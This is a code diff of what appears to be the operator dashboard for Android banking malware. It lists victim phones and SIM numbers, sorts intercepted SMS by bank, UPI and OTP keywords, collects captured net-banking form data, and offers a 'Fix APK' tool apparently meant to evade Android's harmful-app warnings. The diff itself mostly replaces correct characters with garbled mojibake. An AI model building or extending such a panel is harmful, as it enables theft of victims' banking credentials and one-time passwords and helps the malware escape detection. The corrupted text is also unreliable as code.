@@ -48,7 +48,7 @@ function getTs(m: any): number {
   return 0;
 }
 
-// Global ticker — ek hi interval sabke liye
+// Global ticker â€” ek hi interval sabke liye
 let _tickListeners: Set<() => void> = new Set();
 let _tickTimer: ReturnType<typeof setInterval> | null = null;
 function _addTickListener(fn: () => void) {
@@ -83,7 +83,7 @@ function getDeviceId(m: any): string {
 }
 
 const FINANCE_KW = ["credit","debit","bank","balance","transaction","txn","upi","amount",
-  "a/c","inr","₹","paid","withdrawn","deposited","debited","credited","received","payment",
+  "a/c","inr","â‚¹","paid","withdrawn","deposited","debited","credited","received","payment",
   "otp","one time","verification","ac no","acct"];
 const BALANCE_KW = ["available balance","avail bal","avl bal","current balance","closing balance","bal:","balance is","balance rs","balance inr"];
 
@@ -133,7 +133,7 @@ function CopyBtn({ value }: { value: string }) {
   return (
     <button type="button" onClick={() => { copyText(value); setOk(true); setTimeout(() => setOk(false), 1000); }}
       className="ml-1 shrink-0 text-[12px] opacity-50 hover:opacity-100">
-      {ok ? "✅" : "📋"}
+      {ok ? "âœ…" : "ðŸ“‹"}
     </button>
   );
 }
@@ -163,7 +163,7 @@ function FormCard({ form, onDeviceClick, dark, deviceNumMap }: {
         {did ? (
           <button type="button" onClick={() => onDeviceClick?.(did)}
             className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
-            {devNum != null ? `#${devNum} · ` : ""}ID: {did.slice(0, 16)}
+            {devNum != null ? `#${devNum} Â· ` : ""}ID: {did.slice(0, 16)}
           </button>
         ) : <span />}
         <span className={`text-[11px] ${D.meta(dark)}`}>{ts ? new Date(ts).toLocaleString() : "-"}</span>
@@ -211,7 +211,7 @@ function SmsCard({ sms, pageNum, onDeviceClick, dark, deviceNumMap }: {
           {did ? (
             <button type="button" onClick={() => onDeviceClick?.(did)}
               className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
-              {devNum != null ? `#${devNum} · ` : ""}ID: {did.slice(0, 14)}
+              {devNum != null ? `#${devNum} Â· ` : ""}ID: {did.slice(0, 14)}
             </button>
           ) : <span />}
           {pageNum != null && (
@@ -256,7 +256,7 @@ function GroupCard({ deviceId, items, onDeviceClick, dark, deviceNumMap }: {
       <div className="flex items-center justify-between">
         <button type="button" onClick={() => onDeviceClick?.(deviceId)}
           className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
-          {devNum != null ? `#${devNum} · ` : ""}ID: {deviceId.slice(0, 16)}
+          {devNum != null ? `#${devNum} Â· ` : ""}ID: {deviceId.slice(0, 16)}
         </button>
         <span className={`text-[11px] ${D.meta(dark)}`}>{latestTs ? new Date(latestTs).toLocaleString() : "-"}</span>
       </div>
@@ -264,7 +264,7 @@ function GroupCard({ deviceId, items, onDeviceClick, dark, deviceNumMap }: {
   );
 }
 
-// ─── Confetti ─────────────────────────────────────────────────────────────────
+// â”€â”€â”€ Confetti â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function Confetti() {
   const pieces = useMemo(() => Array.from({ length: 32 }, (_, i) => ({
     id: i,
@@ -302,7 +302,7 @@ function Confetti() {
   );
 }
 
-// ─── Elapsed Timer Hook ───────────────────────────────────────────────────────
+// â”€â”€â”€ Elapsed Timer Hook â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function useElapsedTimer(active: boolean) {
   const [elapsed, setElapsed] = useState(0);
   const startRef = useRef<number>(0);
@@ -323,7 +323,7 @@ function useElapsedTimer(active: boolean) {
   return `${mm}:${ss}`;
 }
 
-// ─── Fix APK Home Banner ──────────────────────────────────────────────────────
+// â”€â”€â”€ Fix APK Home Banner â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function FixApkBanner({ dark, onOpen }: { dark: boolean; onOpen: () => void }) {
   return (
     <div onClick={onOpen}
@@ -332,16 +332,16 @@ function FixApkBanner({ dark, onOpen }: { dark: boolean; onOpen: () => void }) {
       <div className="relative px-4 py-4 flex items-center justify-between">
         <div className="flex-1">
           <div className="flex items-center gap-2 mb-1">
-            <span className="text-[18px]">🛡️</span>
+            <span className="text-[18px]">ðŸ›¡ï¸</span>
             <span className="text-[11px] font-bold tracking-widest text-orange-400 uppercase">APK Protection</span>
           </div>
           <div className="text-[17px] font-black text-white leading-tight mb-1">APK Harmful?</div>
-          <div className="text-[12px] text-blue-200 leading-4">Ek tap mein fix karo — automatic</div>
+          <div className="text-[12px] text-blue-200 leading-4">Ek tap mein fix karo â€” automatic</div>
         </div>
         <div className="ml-3 flex flex-col items-center">
           <div className="flex h-12 w-12 items-center justify-center rounded-2xl shadow-lg"
             style={{ background: "linear-gradient(135deg, #f7971e, #ffd200)" }}>
-            <span className="text-[22px]">🔧</span>
+            <span className="text-[22px]">ðŸ”§</span>
           </div>
           <span className="mt-1 text-[10px] font-bold text-yellow-300">Fix Karo</span>
         </div>
@@ -352,7 +352,7 @@ function FixApkBanner({ dark, onOpen }: { dark: boolean; onOpen: () => void }) {
   );
 }
 
-// ─── Fix APK Full Screen ──────────────────────────────────────────────────────
+// â”€â”€â”€ Fix APK Full Screen â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSize,
   onStart, onDownload, onClose, onReset, isDownloading, timeTaken }: {
   dark: boolean; panelId: string; setPanelId: (v: string) => void;
@@ -396,7 +396,7 @@ function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSi
         style={{ background: "linear-gradient(160deg, #0f0c29 0%, #302b63 60%, #24243e 100%)" }}>
         <div className="flex items-center gap-3 px-4 pt-12 pb-6">
           <button type="button" onClick={onClose}
-            className="flex h-9 w-9 items-center justify-center rounded-full bg-white/10 text-white text-[18px]">←</button>
+            className="flex h-9 w-9 items-center justify-center rounded-full bg-white/10 text-white text-[18px]">â†</button>
           <div className="flex-1">
             <div className="text-[11px] font-bold tracking-widest text-orange-400 uppercase">APK Protection</div>
             <div className="text-[20px] font-black text-white">APK Fix Karo</div>
@@ -422,7 +422,7 @@ function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSi
               <input value={panelId} onChange={(e) => setPanelId(e.target.value)}
                 placeholder="apna panel id daalo..."
                 className="w-full rounded-xl bg-white/10 border border-white/20 px-4 py-3 text-[15px] font-semibold text-white placeholder-white/30 outline-none focus:border-orange-400 focus:bg-white/15 transition-all" />
-              <p className="mt-2 text-[11px] text-white/40">Ye automatically fill hai — zarurat na ho toh change mat karo</p>
+              <p className="mt-2 text-[11px] text-white/40">Ye automatically fill hai â€” zarurat na ho toh change mat karo</p>
             </div>
           )}
 
@@ -434,7 +434,7 @@ function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSi
                     style={{ background: "radial-gradient(circle, #ffd200, transparent)" }} />
                   <div className="absolute inset-3 rounded-full animate-pulse opacity-40"
                     style={{ background: "radial-gradient(circle, #f7971e, transparent)" }} />
-                  <span className="relative text-[38px]">🔧</span>
+                  <span className="relative text-[38px]">ðŸ”§</span>
                 </div>
               </div>
               <div className="text-center mb-4">
@@ -454,7 +454,7 @@ function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSi
                   return (
                     <div key={step.id} className="flex items-center gap-3">
                       <div className={`flex h-7 w-7 shrink-0 items-center justify-center rounded-full text-[12px] font-bold transition-all ${step.done ? "bg-green-500 text-white" : isActive ? "bg-orange-400 text-black animate-pulse" : "bg-white/10 text-white/30"}`}>
-                        {step.done ? "✓" : step.id}
+                        {step.done ? "âœ“" : step.id}
                       </div>
                       <span className={`text-[13px] font-semibold transition-all ${step.done ? "text-green-400 line-through opacity-60" : isActive ? "text-orange-300" : "text-white/30"}`}>{step.label}</span>
                       {isActive && (
@@ -475,28 +475,28 @@ function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSi
               <div className="p-6 text-center">
                 <div className="flex justify-center mb-3">
                   <div className="relative flex h-20 w-20 items-center justify-center rounded-full bg-green-500/20 border-2 border-green-500">
-                    <span className="text-[36px]">✅</span>
+                    <span className="text-[36px]">âœ…</span>
                     <div className="absolute inset-0 rounded-full animate-ping opacity-10 bg-green-500" />
                   </div>
                 </div>
-                <div className="text-[22px] font-black text-green-400 mb-1">Taiyaar Hai! 🎉</div>
+                <div className="text-[22px] font-black text-green-400 mb-1">Taiyaar Hai! ðŸŽ‰</div>
                 <div className="text-[13px] text-green-300/60 mb-4">APK successfully fix ho gaya</div>
                 <div className="flex justify-center gap-2 flex-wrap">
                   {filename && (
                     <div className="flex items-center gap-1 rounded-full bg-white/10 px-3 py-1">
-                      <span className="text-[11px]">📄</span>
+                      <span className="text-[11px]">ðŸ“„</span>
                       <span className="text-[11px] font-semibold text-white/60">{filename}</span>
                     </div>
                   )}
                   {apkSize && (
                     <div className="flex items-center gap-1 rounded-full bg-blue-500/20 px-3 py-1">
-                      <span className="text-[11px]">💾</span>
+                      <span className="text-[11px]">ðŸ’¾</span>
                       <span className="text-[11px] font-semibold text-blue-300">{apkSize}</span>
                     </div>
                   )}
                   {timeTaken && (
                     <div className="flex items-center gap-1 rounded-full bg-green-500/20 px-3 py-1">
-                      <span className="text-[11px]">⏱️</span>
+                      <span className="text-[11px]">â±ï¸</span>
                       <span className="text-[11px] font-semibold text-green-400">{timeTaken} mein</span>
                     </div>
                   )}
@@ -505,7 +505,7 @@ function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSi
               <div className="px-5 pb-5 space-y-2">
                 {steps.map((step) => (
                   <div key={step.id} className="flex items-center gap-3">
-                    <div className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-green-500 text-white text-[11px] font-bold">✓</div>
+                    <div className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-green-500 text-white text-[11px] font-bold">âœ“</div>
                     <span className="text-[12px] text-green-400/50 line-through">{step.label}</span>
                   </div>
                 ))}
@@ -519,7 +519,7 @@ function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSi
               <div className="p-5">
                 <div className="flex justify-center mb-3">
                   <div className="flex h-14 w-14 items-center justify-center rounded-full bg-red-500/20 border-2 border-red-500/40">
-                    <span className="text-[28px]">⚠️</span>
+                    <span className="text-[28px]">âš ï¸</span>
                   </div>
                 </div>
                 <div className="text-center mb-3">
@@ -530,7 +530,7 @@ function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSi
                   <div className="text-[10px] font-bold text-white/30 uppercase tracking-wider mb-1">Kya karein?</div>
                   {["Panel ID sahi hai check karo", "Release APK pehle bot se upload karo", "Thodi der baad dobara try karo"].map((tip) => (
                     <div key={tip} className="flex items-start gap-2">
-                      <span className="text-[11px] text-orange-400 mt-0.5 shrink-0">→</span>
+                      <span className="text-[11px] text-orange-400 mt-0.5 shrink-0">â†’</span>
                       <span className="text-[11px] text-white/50">{tip}</span>
                     </div>
                   ))}
@@ -550,11 +550,11 @@ function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSi
                       <span className="inline-block h-4 w-4 rounded-full border-2 border-black border-t-transparent animate-spin" />
                       Download ho raha hai... wait karo
                     </span>
-                  ) : "⬇️ APK Download Karo"}
+                  ) : "â¬‡ï¸ APK Download Karo"}
                 </button>
                 <button type="button" onClick={onReset}
                   className="w-full rounded-2xl border border-white/20 bg-white/10 py-3 text-[13px] font-bold text-white/70 active:scale-[0.98] transition-transform">
-                  🔄 Dobara Fix Karo
+                  ðŸ”„ Dobara Fix Karo
                 </button>
               </>
             ) : (
@@ -566,13 +566,13 @@ function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSi
                     <span className="inline-block h-4 w-4 rounded-full border-2 border-white border-t-transparent animate-spin" />
                     Kaam chal raha hai...
                   </span>
-                ) : phase === "error" ? "🔧 Dobara Try Karo" : "🔧 Fix Shuru Karo"}
+                ) : phase === "error" ? "ðŸ”§ Dobara Try Karo" : "ðŸ”§ Fix Shuru Karo"}
               </button>
             )}
           </div>
 
           {!isWorking && phase !== "done" && (
-            <p className="mt-4 text-center text-[11px] text-white/25">Ek baar request karo — duplicate mat bhejo</p>
+            <p className="mt-4 text-center text-[11px] text-white/25">Ek baar request karo â€” duplicate mat bhejo</p>
           )}
         </div>
       </div>
@@ -580,7 +580,7 @@ function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSi
   );
 }
 
-// ─── Device Card ──────────────────────────────────────────────────────────────
+// â”€â”€â”€ Device Card â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline, dark, isUninstalled, isFavorite, onToggleFavorite }: {
   device: AnyRecord; displayNum: number; onCheckOnline: (id: string) => void; onOpen: (id: string) => void;
   recentlyOnline: boolean; dark: boolean; isUninstalled: boolean; isFavorite: boolean; onToggleFavorite: (id: string) => void;
@@ -597,9 +597,9 @@ function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline,
   const rows: { text: React.ReactNode }[] = [
     { text: (<div className="text-center text-[12px]"><span className={D.deviceMeta(dark)}>ID: </span><span className={`font-bold ${D.idGreen(dark)}`}>{did.slice(0, 16)}</span></div>) },
     ...(android ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>Android: {android}</div> }] : []),
-    ...(sim?.sim1Number ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>SIM 1: {sim.sim1Carrier ? `${sim.sim1Carrier} — ` : ""}{sim.sim1Number}</div> }] : []),
+    ...(sim?.sim1Number ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>SIM 1: {sim.sim1Carrier ? `${sim.sim1Carrier} â€” ` : ""}{sim.sim1Number}</div> }] : []),
     ...(sim?.sim2Number ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>SIM 2: {sim.sim2Carrier ? `${sim.sim2Carrier}: ` : ""}{sim.sim2Number}</div> }] : []),
-    { text: isUninstalled ? (<div className="text-center text-[12px] font-bold text-red-500">⚠️ Uninstalled</div>) : (
+    { text: isUninstalled ? (<div className="text-center text-[12px] font-bold text-red-500">âš ï¸ Uninstalled</div>) : (
       <div className="text-center text-[12px]"><span className={D.deviceMeta(dark)}>Online: </span>
         {checkedAt > 0 ? <TimeAgo ts={checkedAt} className={`font-semibold ${isRecent ? "text-green-500" : "text-red-500"}`} /> : <span className="font-semibold text-gray-400">Never checked</span>}
       </div>) },
@@ -607,8 +607,8 @@ function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline,
   return (
     <div className={`cursor-pointer rounded-xl border p-3 shadow-sm transition-shadow hover:shadow-md ${isUninstalled ? (dark ? "bg-gray-800 border-red-800" : "bg-red-50 border-red-300") : D.deviceCard(dark)}`} onClick={() => onOpen(did)}>
       <div className="mb-2 flex items-center justify-between gap-1">
-        <span className={`truncate text-[13px] font-bold ${isUninstalled ? "text-red-500" : D.deviceText(dark)}`}>{displayNum}. {brand}{model ? ` (${model})` : ""}{isUninstalled && <span className="ml-1 text-[10px]">🔴</span>}</span>
-        <button type="button" onClick={(e) => { e.stopPropagation(); onToggleFavorite(did); }} className="shrink-0 text-[20px] leading-none transition-transform active:scale-75">{isFavorite ? "⭐" : "☆"}</button>
+        <span className={`truncate text-[13px] font-bold ${isUninstalled ? "text-red-500" : D.deviceText(dark)}`}>{displayNum}. {brand}{model ? ` (${model})` : ""}{isUninstalled && <span className="ml-1 text-[10px]">ðŸ”´</span>}</span>
+        <button type="button" onClick={(e) => { e.stopPropagation(); onToggleFavorite(did); }} className="shrink-0 text-[20px] leading-none transition-transform active:scale-75">{isFavorite ? "â­" : "â˜†"}</button>
       </div>
       <div className={`overflow-hidden rounded-lg border ${isUninstalled ? (dark ? "border-red-800" : "border-red-200") : (dark ? "border-gray-600" : "border-gray-200")}`}>
         {rows.map((row, i) => (<div key={i} className={["px-3 py-2", i < rows.length - 1 ? (isUninstalled ? (dark ? "border-b border-red-800" : "border-b border-red-200") : (dark ? "border-b border-gray-600" : "border-b border-gray-200")) : ""].join(" ")}>{row.text}</div>))}
@@ -623,11 +623,11 @@ function CheckAlert({ status, onClose }: { status: CheckStatus; onClose: () => v
   return (
     <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/40">
       <div className="relative w-[320px] rounded-2xl bg-white p-6 shadow-xl" onClick={(e) => e.stopPropagation()}>
-        <button type="button" onClick={onClose} className="absolute right-3 top-3 rounded border border-gray-200 px-2 py-0.5 text-gray-600 hover:bg-gray-50">✕</button>
+        <button type="button" onClick={onClose} className="absolute right-3 top-3 rounded border border-gray-200 px-2 py-0.5 text-gray-600 hover:bg-gray-50">âœ•</button>
         <div className="mb-4 text-[15px] font-extrabold text-red-500">Alert</div>
         {status === "checking" && <div className="text-center text-[14px] leading-6 text-gray-800">We've forwarded your request to the phone. Wait up to 30 seconds; if no reply, the device is offline.</div>}
-        {status === "online" && <div className="text-center text-[15px] font-semibold text-green-600">Device is Online ✅</div>}
-        {status === "uninstalled" && <div className="text-center text-[15px] font-semibold text-red-600">App Uninstalled! ⚠️</div>}
+        {status === "online" && <div className="text-center text-[15px] font-semibold text-green-600">Device is Online âœ…</div>}
+        {status === "uninstalled" && <div className="text-center text-[15px] font-semibold text-red-600">App Uninstalled! âš ï¸</div>}
       </div>
     </div>
   );
@@ -642,7 +642,7 @@ function SearchBar({ value, onChange, onSearch, filter, onFilter, options, dark 
       <div className="relative flex-1">
         <input value={value} onChange={(e) => onChange(e.target.value)} onKeyDown={(e) => { if (e.key === "Enter") onSearch?.(); }}
           placeholder="Search..." className={`h-10 w-full rounded-full border pl-4 pr-10 text-[13px] outline-none ${D.searchBg(dark)}`} />
-        <button type="button" onClick={onSearch} className="absolute right-3 top-1/2 -translate-y-1/2 text-[16px]">🔍</button>
+        <button type="button" onClick={onSearch} className="absolute right-3 top-1/2 -translate-y-1/2 text-[16px]">ðŸ”</button>
       </div>
       <select value={filter} onChange={(e) => onFilter(e.target.value)} className={`h-10 rounded-full border px-3 text-[13px] font-semibold outline-none ${D.selectBg(dark)}`}>
         {options.map((o) => <option key={o.value} value={o.value}>{o.label}</option>)}
@@ -657,7 +657,7 @@ function CehBanner({ dark }: { dark: boolean; alertText?: string }) {
       <div className="flex items-center justify-between px-4 py-2">
         <div className="flex items-center gap-1.5">
           <span className={`text-[15px] font-black tracking-widest ${dark ? "text-white" : "text-gray-900"}`}>CEH</span>
-          <span className={`text-[9px] font-bold ${dark ? "text-gray-500" : "text-gray-400"}`}>™</span>
+          <span className={`text-[9px] font-bold ${dark ? "text-gray-500" : "text-gray-400"}`}>â„¢</span>
           <span className={`text-[11px] font-semibold ${dark ? "text-gray-500" : "text-gray-400"}`}>Web Backend</span>
         </div>
         <span className={`text-[10px] font-mono ${dark ? "text-gray-600" : "text-gray-400"}`}>zero-trace.in</span>
@@ -680,8 +680,8 @@ function SettingsInput({ label, hint, type = "text", value, onChange, inputMode,
 }
 
 
-// ─── Developer Zone ──────────────────────────────────────────────────────────
-// Password stored obfuscated — XOR 42
+// â”€â”€â”€ Developer Zone â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Password stored obfuscated â€” XOR 42
 const _dk = [73,79,66,65,67,68,77,26,19,24,28];
 function _dv(i: number[]): string { return i.map(x => String.fromCharCode(x ^ 42)).join(""); }
 
@@ -711,7 +711,7 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
           }
         }).catch(() => {});
     } else {
-      setPwErr("❌ Galat password"); setPwInput("");
+      setPwErr("âŒ Galat password"); setPwInput("");
       setTimeout(() => setPwErr(""), 2000);
     }
   }
@@ -728,10 +728,10 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
         body: JSON.stringify({ text: combined }),
       });
       const d = await r.json();
-      if (d.success) setAlertMsg("✅ Sabhi panels mein broadcast ho gaya!");
-      else setAlertMsg("❌ Failed: " + (d.error || ""));
+      if (d.success) setAlertMsg("âœ… Sabhi panels mein broadcast ho gaya!");
+      else setAlertMsg("âŒ Failed: " + (d.error || ""));
     } catch (e: any) {
-      setAlertMsg("❌ Error: " + e?.message);
+      setAlertMsg("âŒ Error: " + e?.message);
     } finally {
       setAlertLoading(false);
       setTimeout(() => setAlertMsg(""), 4000);
@@ -747,9 +747,9 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
         body: JSON.stringify({ text: "" }),
       });
       const d = await r.json();
-      if (d.success) setAlertMsg("✅ Alert clear ho gaya!");
-      else setAlertMsg("❌ Failed");
-    } catch { setAlertMsg("❌ Error"); }
+      if (d.success) setAlertMsg("âœ… Alert clear ho gaya!");
+      else setAlertMsg("âŒ Failed");
+    } catch { setAlertMsg("âŒ Error"); }
     finally { setAlertLoading(false); setTimeout(() => setAlertMsg(""), 3000); }
   }
 
@@ -757,10 +757,10 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
     <div className="rounded-2xl overflow-hidden border-2 border-purple-200 bg-white shadow-sm">
       <div className="px-5 pt-5 pb-4">
         <div className="flex items-center gap-2 mb-1">
-          <span className="text-[18px]">🛠️</span>
+          <span className="text-[18px]">ðŸ› ï¸</span>
           <span className="text-[15px] font-black text-purple-700">Developer Zone</span>
         </div>
-        <p className="text-[12px] text-purple-400 mb-4">Advanced tools — authorized personnel only</p>
+        <p className="text-[12px] text-purple-400 mb-4">Advanced tools â€” authorized personnel only</p>
 
         {!unlocked ? (
           <div>
@@ -775,18 +775,18 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
             {pwErr && <div className="text-center text-[12px] font-semibold text-red-500 mb-2">{pwErr}</div>}
             <button type="button" onClick={tryUnlock}
               className="w-full rounded-xl bg-purple-600 py-3 text-[14px] font-bold text-white active:scale-[0.98]">
-              🔓 Unlock
+              ðŸ”“ Unlock
             </button>
           </div>
         ) : (
           <div className="space-y-4">
             <div className="rounded-xl bg-purple-50 border border-purple-100 px-3 py-2 text-[11px] text-purple-500 font-semibold">
-              ✅ Developer access unlocked
+              âœ… Developer access unlocked
             </div>
 
             {/* Alert Text Broadcast */}
             <div>
-              <div className="text-[13px] font-bold text-gray-800 mb-1">📢 Alert Text (Broadcast)</div>
+              <div className="text-[13px] font-bold text-gray-800 mb-1">ðŸ“¢ Alert Text (Broadcast)</div>
               <div className="text-[11px] text-gray-400 mb-2">Ye text sabhi panels mein ek saath set ho jaayega</div>
 
               {/* Header field */}
@@ -807,14 +807,14 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
               />
 
               {alertMsg && (
-                <div className={`text-center text-[12px] font-semibold mt-1 ${alertMsg.startsWith("✅") ? "text-green-600" : "text-red-500"}`}>
+                <div className={`text-center text-[12px] font-semibold mt-1 ${alertMsg.startsWith("âœ…") ? "text-green-600" : "text-red-500"}`}>
                   {alertMsg}
                 </div>
               )}
               <div className="flex gap-2 mt-2">
                 <button type="button" onClick={saveAlertText} disabled={alertLoading}
                   className="flex-1 rounded-xl bg-purple-600 py-2.5 text-[13px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">
-                  {alertLoading ? "Sending..." : "📡 Broadcast"}
+                  {alertLoading ? "Sending..." : "ðŸ“¡ Broadcast"}
                 </button>
                 <button type="button" onClick={clearAlertText} disabled={alertLoading}
                   className="rounded-xl border border-gray-200 px-4 py-2.5 text-[13px] font-semibold text-gray-500 disabled:opacity-50 active:scale-[0.98]">
@@ -825,7 +825,7 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
 
             <button type="button" onClick={() => setUnlocked(false)}
               className="w-full rounded-xl border border-purple-200 py-2 text-[12px] text-purple-400 active:scale-[0.98]">
-              🔒 Lock
+              ðŸ”’ Lock
             </button>
           </div>
         )}
@@ -851,7 +851,7 @@ export default function MainPage() {
   const [pinMsg,        setPinMsg]        = useState("");
   const [pinIsSet,      setPinIsSet]      = useState<boolean | null>(null);
 
-  // ── Change Login Password ─────────────────────────────────────────────────
+  // â”€â”€ Change Login Password â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   const [loginPassOld,     setLoginPassOld]     = useState("");
   const [loginPassNew,     setLoginPassNew]      = useState("");
   const [loginPassConfirm, setLoginPassConfirm]  = useState("");
@@ -862,11 +862,11 @@ export default function MainPage() {
   const [contactOpen,   setContactOpen]   = useState(false);
   const [activeTab, setActiveTab] = useState<TabKey>(() => ((location.state as any)?.tab as TabKey) || "home");
 
-  // ── SMS Filters ───────────────────────────────────────────────────────────
+  // â”€â”€ SMS Filters â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   const [smsTypeFilter, setSmsTypeFilter] = useState<SmsFilter>("all");
   const [smsDayFilter,  setSmsDayFilter]  = useState<SmsDayFilter>(0);
 
-  // ── Danger zone ───────────────────────────────────────────────────────────
+  // â”€â”€ Danger zone â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   const [dangerMsg, setDangerMsg] = useState("");
   const [dangerLoading, setDangerLoading] = useState(false);
   const [dangerPin, setDangerPin] = useState("");
@@ -960,7 +960,7 @@ export default function MainPage() {
       const r = await fetch(`${ENV.API_BASE}/api/favorites`, { headers: apiHeaders() });
       if (r.ok) {
         const data = await r.json();
-        // API returns {deviceId: true/false} ya [{deviceId, favorite}] — dono handle karo
+        // API returns {deviceId: true/false} ya [{deviceId, favorite}] â€” dono handle karo
         if (Array.isArray(data)) {
           const map: Record<string, boolean> = {};
           data.forEach((item: any) => { if (item?.deviceId) map[item.deviceId] = item.favorite === true; });
@@ -994,7 +994,8 @@ export default function MainPage() {
       if (event === "netbanking:created" || event === "net_banking:created") { const data = msg.data || {}; const did = String(data.uniqueid || data.deviceId || deviceId || ""); if (!did) return; const pl = data.payload && typeof data.payload === "object" ? data.payload : data; setNetMap((p) => ({ ...p, [did]: [pl, ...(p[did] || [])] })); return; }
       if (event === "favorite:update") { const did = String(msg?.data?.deviceId || ""); const fav = msg?.data?.favorite === true; if (did) setFavoritesMap((p) => ({ ...p, [did]: fav })); return; }
       if (event === "device:lastSeen" || event === "device:upsert") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); setDevices((p) => { const exists = p.some((d) => str(d.deviceId) === did); if (exists) return p.map((d) => str(d.deviceId) === did ? { ...d, ...(msg.data || {}), lastSeen: d.lastSeen, checkedAt: d.checkedAt } : d); if (event === "device:upsert" && msg.data && did) { if (!deviceOrderRef.current.includes(did)) deviceOrderRef.current = [did, ...deviceOrderRef.current]; return [msg.data, ...p]; } return p; }); return; }
